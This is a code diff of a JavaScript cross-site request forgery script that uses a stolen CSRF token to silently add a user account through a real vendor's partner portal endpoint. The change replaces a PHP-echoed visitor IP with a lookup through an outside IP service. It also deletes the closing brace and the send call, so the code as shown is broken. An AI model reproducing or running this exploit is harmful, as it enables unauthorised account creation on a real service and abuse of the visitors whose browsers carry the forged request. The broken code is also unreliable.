@@ -35,9 +35,14 @@
 
 
 // Sends the CSRF attack to POST data to the Users Add section, using the previously obtained CSRF token
-function csrf(token, key) {
-    var randomNum = '<?php echo $_SERVER['REMOTE_ADDR']; ?>';
-    var randomEmail = "okpay+"+randomNum+"@live.com";
+function getIP() {
+    return fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => data.ip);
+}
+
+getIP().then(ip => {
+    var randomEmail = "okpay+"+ip+"@live.com";
     var params = "_Token%5Bfields%5D=" + token;
     params += "&fname=Naysser&";
     params += "lname=trying&";
@@ -50,5 +55,3 @@ function csrf(token, key) {
     var x1 = new XMLHttpRequest();
     x1.open("POST", "https://pan.bitdefender.com/partners/my-users-save/");
     x1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    x1.send(params);
-}
